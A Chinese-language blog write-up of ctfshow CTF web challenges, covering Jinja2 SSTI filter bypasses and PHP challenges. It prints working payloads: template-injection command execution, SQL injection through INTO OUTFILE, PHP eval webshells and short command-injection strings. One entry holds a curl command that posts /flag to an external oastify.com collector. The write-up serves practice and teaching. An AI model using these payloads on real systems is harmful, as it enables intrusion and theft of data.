---
title: ctfshow SSTI 与过滤绕过
date: 2025-10-05 10:00:00
author: Xendr1a
categories: [CTF题解, ctfshow]
tags: [ctfshow, SSTI]
description: ctfshow SSTI 与过滤绕过：关键字、字符与长度限制。
toc: true
---
## ssti

### web361

无过滤

```text
?name={% raw %}{{{% endraw %}''.__class__.__bases__[0].__subclasses__()}}#查
?name={% raw %}{{{% endraw %}''.__class__.__bases__[0].__subclasses__()[132].__init__.globals__['popen']('cat /flag').read()}}
```

### web362

过滤了数字2，3

```text
?name={% raw %}{{{% endraw %}''.__class__.__bases__[0].__subclasses__()[140-8].__init__.globals__['popen']('cat /flag').read()}}
```

### web363

过滤了' '和" "

可以用()或者[]绕过

```text
?name={% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.args.ary1](request.args.ary2).read()}}&ary1=popen&ary2=cat+/flag
```

### web364

过滤了arg

我们还有

```text
request.cookies.    #cookie传参
request.values.    
```

```text
?name={% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[request.values.ary1](request.values.ary2).read()}}&ary1=popen&ary2=cat+/flag
```

### web365

过滤了''和[]和arg

可以使用getitem

`__getitem__(132)==[132]`

```text
?name={% raw %}{{{% endraw %}().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.a)(request.values.b).read()}}&a=popen&b=cat /flag
```

### web366

过滤加了个_

request.values可以绕过，但是太长了，这里学习到了一种新方法

```text
?name={% raw %}{{{% endraw %}(lipsum | attr(request.values.b)).os.popen(request.values.a).read()}}&a=cat /flag&b=__globals__
```

```text
lipsum 是一个 Python 函数对象，其 __globals__ 属性会返回 该函数所在模块的全局变量字典。
lipsum.__globals__含有os模{% raw %}{{{% endraw %}lipsum.__globals__['os'].popen('ls').read()}}
```

```text
| attr 是一个 过滤器（Filter），用于 动态访问对象的属性或方法

""|attr("__class__")
相当于
"".__class__

{% raw %}{{{% endraw %}lipsum.__globals__['os'].popen('ls').read()}}
{% raw %}{{{% endraw %} 
  (lipsum | attr("__globals__"))          {# 获取 lipsum 的全局变量字典 #}
  | attr("__getitem__")("os")             {# 获取 os 模块 #}
  | attr("popen")("id")                   {# 调用 os.popen #}
  | attr("read")()                        {# 读取命令结果 #}
}}
```

在过滤.的时候也可以使用| attr

### web367

经测试多过滤了一个os

```text
?name={% raw %}{{{% endraw %}(lipsum | attr(request.values.a)).get(request.values.c).popen(request.values.b).read()}}&a=__globals__&b=cat /flag&c=os
```

```text
先说说get
在python中，get() 是字典（dict）类型的一个内置方法，用于安全地获取字典中某个键（key）对应的值（value）。它的核心作用是 避免直接通过键访问时可能引发的 KeyError 异常，并提供默认值功能。
```

关于这里为什么用get呢

```text
Jinja2 模板语法中，属性访问必须通过 . 或 [] 完成，不能动态拼接属性名。
(lipsum | attr(request.values.a)).(request.values.c) 访问属性，这种写法是 非法的。
通过get获得c的值是合法的，使用 .get() 方法可以动态从请求参数中提取键名，进而访问 lipsum.__globals__ 字典中的 os 模块。
```

### web368

加了个过滤{% raw %}{{{% endraw %}

我们可以使用{% raw %}{%{% endraw %}printf%}，绕过

```text
?name={% raw %}{%{% endraw %}print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()%}&a=__globals__&b=os&c=cat /flag
```

### web369

```text
?name=
{% raw %}{%{% endraw %} set po=dict(po=a,p=a)|join%}
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(24)%}
{% raw %}{%{% endraw %} set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% raw %}{%{% endraw %} set chr=x.chr%}
{% raw %}{%{% endraw %} set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
{% raw %}{%{% endraw %}print(x.open(file).read())%}
```

### web370

应该是数字没了

面向wp做题，发现可以用全角符号绕过

```text
?name=
{% raw %}{%{% endraw %} set po=dict(po=a,p=a)|join%}
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(２４)%}
{% raw %}{%{% endraw %} set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% raw %}{%{% endraw %} set chr=x.chr%}
{% raw %}{%{% endraw %} set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
{% raw %}{%{% endraw %}print(x.open(file).read())%}
```

```text
脚本
def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
while 1:
    t = ''
    s = input("输入想要转换的数字字符串：")
    for i in s:
        t += half2full(i)
    print(t)
```

### web371

又加了一个过滤print

方法，用的是curl外带加chr()绕过

curl -X POST -F xx=@/flag http://301vogfw8sfhp6fewko0404ch3nublza.oastify.com

```text
#佬的脚本chr字符脚本
def half2full(half):
    full = ''
    for ch in half:
        if ord(ch) in range(33, 127):
            ch = chr(ord(ch) + 0xfee0)
        elif ord(ch) == 32:
            ch = chr(0x3000)
        else:
            pass
        full += ch
    return full
string = input("你要输入的字符串：")
result = ''
def str2chr(s):
    global  result
    for i in s:
        result += "chr("+half2full(str(ord(i)))+")%2b"
str2chr(string)
print(result[:-3])
```

```text
?name=
{% raw %}{%{% endraw %} set po=dict(po=a,p=a)|join%}
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(２４)%}
{% raw %}{%{% endraw %} set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set ohs=(dict(o=a,s=a)|join)%}
{% raw %}{%{% endraw %} set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% raw %}{%{% endraw %} set chr=x.chr%}
{% raw %}{%{% endraw %} set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１１５)%2bchr(１０３)%2bchr(９９)%2bchr(１０７)%2bchr(５２)%2bchr(５３)%2bchr(１１８)%2bchr(１０８)%2bchr(１１１)%2bchr(１０４)%2bchr(１１８)%2bchr(５４)%2bchr(５３)%2bchr(１１８)%2bchr(１１８)%2bchr(５１)%2bchr(９９)%2bchr(５７)%2bchr(５２)%2bchr(１１２)%2bchr(１０７)%2bchr(１１２)%2bchr(１０７)%2bchr(４９)%2bchr(１２０)%2bchr(１１５)%2bchr(５１)%2bchr(１０６)%2bchr(１１４)%2bchr(５７)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% raw %}{%{% endraw %} if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc #测试的
{% raw %}{%{% endraw %} endif %}
```

## web369

这题我想单独学习一下payload的思路

```text
?name=
{% raw %}{%{% endraw %} set po=dict(po=a,p=a)|join%}
#这里是运用到了python字典的知识dict(po=a, p=a) 会生成字典 {"po": a, "p": a}。
#|join 将字典的 键（keys） 合并为字符串，即 "pop"
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(24)%}
#这里单独放下面讲，就是让a=_
{% raw %}{%{% endraw %} set ini=(a,a,dict(init=a)|join,a,a)|join()%}
#这里是__init__下面以此类推
{% raw %}{%{% endraw %} set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
#这里联合上面的值，访问 __builtins__ 模块。（为了使用chr
{% raw %}{%{% endraw %} set chr=x.chr%}
{% raw %}{%{% endraw %} set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
#chr(47) → /，chr(102) → f，chr(108) → l，chr(97) → a，chr(103) → g，组合成 /flag。
#x.open(file).read() 调用 open('/flag').read()。
{% raw %}{%{% endraw %}print(x.open(file).read())%}
```

```text
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(24)%}
在 Jinja2 模板引擎中，表达式 a=(()|select|string|list).pop(24) 之所以将变量 a 赋值为下划线（_），是因为它利用了模板过滤器的链式操作和生成器对象字符串表示的特定结构

select 是 Jinja2 的过滤器，通常用于筛选可迭代对象中符合条件的元素。
当不传递条件参数时（如 ()|select），它会生成一个空的生成器对象。
生成器对象的默认字符串表示形如：
"<generator object select_or_reject at 0x...>"
| string 将生成器对象转换为字符串：
str_result = str(() | select)  # 例如：'<generator object select_or_reject at 0x7f8c1d3e7a50>'
| list 将字符串转换为字符列表：
list_result = list(str_result)  # 例如：['<', 'g', 'e', 'n', ..., '_', ...]
字符串 "<generator object select_or_reject ...>" 的字符索引如下：
0: <
1: g
2: e
3: n
...
24: _  # 对应 "select_or_reject" 中的下划线
.pop(24) 提取索引 24 的字符，即 _。
所以得到了a=_
```

```text
pop()  用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
```

## 特定函数绕过

### web396

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);  #检测url结构  我们能用;截断后加东西
    shell_exec('echo '.$url['host'].'> '.$url['path']);

}else{
    highlight_file(__FILE__);
}
```

```text
?url=127.0.0.1/1;cat fl0g.php > 1.txt #重定向
```

解释一下这个parse_url,然后代码就比较容易看懂了

```text
<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';
print_r(parse_url($url));
echo parse_url($url, PHP_URL_PATH);
?>  

以上例程会输出：
Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)
/path
```

### web397

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);

}else{
    highlight_file(__FILE__);
}
```

一样能用 `?url=127.0.0.1/1;cat fl0g.php &gt; 1.txt`

### web398

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;/', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

```text
过滤了;   
我们还能用|
?url=127.0.0.1/1|cat fl0g.php > 1.txt
```

### web399

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;|>/', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

```text
才发现，检测的是host里面的;和>
?url=127.0.0.1/1;cat f* > 1.txt
```

### web400

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(!preg_match('/;|>|http|https/i', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

```text
过滤了http和https，但我们好像压根没用上这两
?url=127.0.0.1/1;cat f* >1.txt
```

### web401

```text
<?php
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    var_dump($url);
    if(!preg_match('/;|>|http|https|\|/i', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

```text
?url=127.0.0.1/1;cat f* >1.txt
```

### web402

```text
<?php
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    var_dump($url);
    if(preg_match('/http|https/i', $url['scheme'])){
        die('error');
    }
    if(!preg_match('/;|>|\||base/i', $url['host'])){
        shell_exec('echo '.$url['host'].'> /tmp/'.$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

```text
?url=127.0.0.1/1;cat f* >1.txt
```

### web403

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){
        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
    }

}else{
    highlight_file(__FILE__);
}
```

```text
加了个$url['scheme']那我们要加个头才行了
if(preg_match('/^((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)$/', $url['host'])){
        shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
    }
这个是对于ip的检测，严格验证host是否为合法的IPv4地址（如 192.168.1.1）
那我们其实加个头就行了
```

```text
?url=http://127.0.0.1/1;cat f* >1.txt
```

### web404

```text
打不开
```

### web405

```text
<?php
error_reporting(0);
if(isset($_GET['url'])){
    $url = parse_url($_GET['url']);
    if(preg_match('/((2[0-4]\d|25[0-5]|[01]?\d\d?)\.){3}(2[0-4]\d|25[0-5]|[01]?\d\d?)./', $url['host'])){
        if(preg_match('/^\/[A-Za-z0-9]+$/', $url['path'])){
            if(preg_match('/~|\.|php/', $url['scheme'])){
                shell_exec('curl '.$url['scheme'].$url['host'].$url['path']);
            }
            
        }
    }

}else{
    highlight_file(__FILE__);
    echo 'parse_url 好强大';
}
parse_url 好强大
```

```text
host为有效ip,scheme需要包含~或者.或者php,path以/开头并且只包括字母数字
?url=http.://127.0.0.1;cat f* >1.txt;/1
```

### web406

```text
<?php
require 'config.php';
//flag in db
highlight_file(__FILE__);
$url=$_GET['url'];
if(filter_var ($url,FILTER_VALIDATE_URL)){
    $sql = "select * from links where url ='{$url}'";
    $result = $conn->query($sql);
}else{
    echo '不通过';
}
```

```text
这题有点麻烦FILTER_VALIDATE_URL这个检测的是url的格式正不正确
$result = $conn->query($sql);执行sql语句
有两个方法把联合注入和写🐎
用这个写入查看回显，/into/**/outfile/**/'/var/www/html/1.txt'%23
```

```text
1.union
爆数据库
url=http://127.0.0.1/index.php'union/**/select/**/1,group_concat(schema_name)/**/from/**/information_schema.schemata/**/into/**/outfile/**/'/var/www/html/2.txt'%23

爆表 在当前数据库看到flag的表 url=http://127.0.0.1/index.php'union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/into/**/outfile/**/'/var/www/html/3.txt'%23

爆字段 发现flag表中有三个字段，flag,id,url url=http://127.0.0.1/index.php'union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/into/**/outfile/**/'/var/www/html/4.txt'%23

拿flag
url=http://127.0.0.1/index.php'union/**/select/**/1,flag/**/from/**/flag/**/into/**/outfile/**/'/var/www/html/5.txt'%23

2.写🐎
url=http://127.0.0.1/index.php'union/**/select/**/1,0x3c3f3d2f2a2a2f406576616c28245f504f53545b636d645d293b3f3e/**/into/**/outfile/**/'/var/www/html/1.php'%23
<?=/**/@eval($_POST[cmd]);?>
写🐎半天没找到flag。。。
```

### web407

```text
<?php
highlight_file(__FILE__);
error_reporting(0);
$ip=$_GET['ip'];

if(filter_var ($ip,FILTER_VALIDATE_IP)){
    call_user_func($ip);
}

class cafe{
    public static function add(){
        echo file_get_contents('flag.php');
    }
}
```

```text
FILTER_VALIDATE_IP支持检测
IPv4：192.168.1.1
IPv6：2001:0db8:85a3:0000:0000:8a2e:0370:7334
压缩格式 IPv6：2001:db8::8a2e:370:7334
又因为静态函数调用可以care::add
就等于care:0:0:0:0:0:0:add
所以能调用函数
```

### web408

```text
<?php
highlight_file(__FILE__);
error_reporting(0);
$email=$_GET['email'];

if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
    file_put_contents(explode('@', $email)[1], explode('@', $email)[0]);
}
```

```text
file_put_contents — 将一个字符串写入文件
?email="<?=eval($_POST[1]);?>"@1.php
很奇怪的一个性质
双引号包裹可以绕过检测
```

### web409

```text
<?php
highlight_file(__FILE__);
error_reporting(0);
$email=$_GET['email'];
if(filter_var ($email,FILTER_VALIDATE_EMAIL)){
    $email=preg_replace('/.flag/', '', $email);
    eval($email);
}
```

```text
我们这题要换换思维了
首先我们要通过FILTER_VALIDATE_EMAIL
然后执行eval
我捣鼓半天"system('id');"@abcd.com，突然意识到有@123.php好像整不了
然后想到了闭合"system('id');?>"@abcd.com,还是执行不了
看看wp前面要加个flag？"flagsystem('id');?>"@abcd.com  #应该是要经过preg_replace替换把前面的"也替换掉
有回显了但是ls /没有回显
蒜鸟蒜鸟写🐎吧
?email="flageval($_POST[1]);?>"@abcd.com
1=system("cat /f*");
```

### web410

```text
<?php
highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
$b=$_GET['b'];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
    if($b=='true' || intval($b)>0){
        die('FLAG NOT HERE');
    }else{
        echo $flag;
    }
}
```

```text
FILTER_VALIDATE_BOOLEAN 是 PHP 中用于验证布尔值的过滤器（常与 filter_var() 或 filter_input() 配合使用）。它的核心功能是将符合特定规则的字符串/数字转换为真正的布尔值 true 或 false。
验证规则
输入值	返回值	说明
true, 1, "1"	true	真值
"true", "on", "yes"	true	不区分大小写（如 "YES" 也有效）
false, 0, "0"	false	假值
"false", "off", "no", ""	false	空字符串 "" 也被视为假值
其他值（如 "abc", 2, null）	false	默认行为：无效值返回 false
其他值 + FILTER_NULL_ON_FAILURE	null	严格模式下无效值返回 null

又因为
对于b是弱比较，我们直接b=Ture就ok了
```

### web411

```text
<?php
highlight_file(__FILE__);
error_reporting(0);
include('flag.php');
$b=$_GET['b'];
if(filter_var ($b,FILTER_VALIDATE_BOOLEAN)){
    if($b=='true' || intval($b)>0 ||$b=='on' || $b=='ON'){
        die('FLAG NOT HERE');
    }else{
        echo $flag;
    }
}
```

```text
b=True还是ok
```

### web412

```text
<?php
highlight_file(__FILE__);

$ctfshow=$_POST['ctfshow'];

if(isset($ctfshow)){
    file_put_contents('flag.php', '//'.$ctfshow,FILE_APPEND);
    include('flag.php');
}
?>
```

我们看到

```text
file_put_contents('flag.php', '//'.$ctfshow,FILE_APPEND);
在文件末尾追加//和$ctfshow
我们能用换行绕过%0a,或者闭合?>
ctfshow=%0asystem("cat f*");
ctfshow=?><?php system("cat f*");?>
```

### web413

```text
<?php
highlight_file(__FILE__);

$ctfshow=$_POST['ctfshow'];

if(isset($ctfshow)){
        file_put_contents('flag.php', '/*'.$ctfshow.'*/',FILE_APPEND);
    include('flag.php');
}
```

```text
ctfshow=*/system('cat flag.php');/*
```

### web414

```text
<?php
highlight_file(__FILE__);
include('flag.php');
$ctfshow=$_GET['ctfshow'];

if($ctfshow==true){
    if(sqrt($ctfshow)>=sqrt(intval($flag))){
        echo 'FLAG_NOT_HERE';
    }else{
        echo $flag;
    }
}
```

```text
主要注意到这里sqrt($ctfshow)>=sqrt(intval($flag)
我们要让其为假，
sqrt()
负数平方根 = NaN（非数字）
NaN 与任何数字比较都返回 false
sqrt(-1) >= sqrt(...) → false → 进入 else 分支
所以我们只需要ctfshow=-1
```

### web415

```text
<?php
error_reporting(0);
highlight_file(__FILE__);

$k = $_GET[k];

function getflag(){
    echo file_get_contents('flag.php');
}

if($k=='getflag'){
    die('FLAG_NOT_HERE');
}else{
    call_user_func($k);
}
```

```text
两种方法大小写绕过和/
?k=Getflag
?k=\getflag
在名称前加上前缀\表示该名称是全局空间中的名称，如果没有定义任何命名空间，所有的类与函数的定义都是在全局空间，与 PHP 引入命名空间概念前一样。\getflag()与getflag()指代的是同一个函数
```

### web416

```text
<?php
error_reporting(0);
highlight_file(__FILE__);

class ctf{
    public function getflag(){
        return 'fake flag';
    }
    final public function flag(){
        echo file_get_contents('flag.php');
    }
}

class show extends ctf{
    public function __construct($f){
        call_user_func($f);
    }
}

echo new show($_GET[f]);
```

```text
直接调用函数
f=ctf::flag
```

### web417

```text
解密出来是这个
include('flag.php');
$c=$_GET['ctf'];
if($c=='show'){
	echo $flag;
}else{
	echo 'FLAG_NOT_HERE';
}
?>
ctf=show
```

### web418

```text
<?php
$key= 0;
$clear='clear.php';
highlight_file(__FILE__);
//获取参数
$ctfshow=$_GET['ctfshow'];
//包含清理脚本
include($clear);
extract($_POST);
if($key===0x36d){
    //帮黑阔写好后门
    eval('<?php '.$ctfshow.'?>');
}else{
    $die?die('FLAG_NOT_HERE'):clear($clear);
}

function clear($log){
    shell_exec('rm -rf '.$log);
}

FLAG_NOT_HERE
```

```text
整半天进不去eval(),原来是因为$key是string型，在强比较无法等于数字0x36d
我们看到还有一个shell_exec() 可以利用,；分开然后写命令
die=0&clear=;cp flag.php 1.txt
```

### web419

```text
<?php
highlight_file(__FILE__);
$code = $_POST['code'];
if(strlen($code) < 17){
    eval($code);
}
```

```text
只能16个的话
code=eval($_POST[1]);&1=system('cat f*');
```

### web420

```text
<?php
highlight_file(__FILE__);
$code = $_POST['code'];
if(strlen($code) < 8){
    system($code);
}
```

```text
变7个了但是换成了system()
ls和ls /都没有
那我们nl ../*
```

### web421

```text
<?php
highlight_file(__FILE__);
$code = $_POST['code'];
if(strlen($code) < 6){
    system($code);
}
```

```text
5个
nl f*
```

### web422

```text
<?php
highlight_file(__FILE__);
$code = $_POST['code'];
if(strlen($code) < 5){
    system($code);
}
```

```text
4个。。。
nl *
```

### web423

```text
f12有个参数?code
然后就是纯猜，啥都没有
?code=os.popen("cat /f*").read()
```

### web424

```text
知道文件名可以直接open
?code=open('/flag').read()
```
